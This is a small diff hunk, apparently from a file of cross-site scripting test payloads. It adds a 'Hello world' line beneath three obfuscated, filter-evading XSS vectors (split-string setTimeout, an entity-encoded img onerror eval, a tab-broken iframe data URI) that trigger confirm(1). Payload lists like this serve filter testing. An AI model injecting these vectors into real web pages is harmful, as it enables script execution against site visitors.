@@ -36,3 +36,4 @@ http://www.&lt;script abc&gt;setTimeout('confirm(1)',1)&lt;/script .com&gt;
 &lt;script&gt;x='con';s='firm';S='(1)';setTimeout(x+s+S,0);&lt;/script&gt;
 &lt;img/id=&quot;confirm&amp;lpar;1&amp;#x29;&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;#x29;&gt;
 &lt;iframe/src=&quot;data&amp;colon;text&amp;sol;html,&lt;s&amp;Tab;cr&amp;Tab;ip&amp;Tab;t&gt;confirm(1)&lt;/script&gt;&quot;&gt;
+Hello world
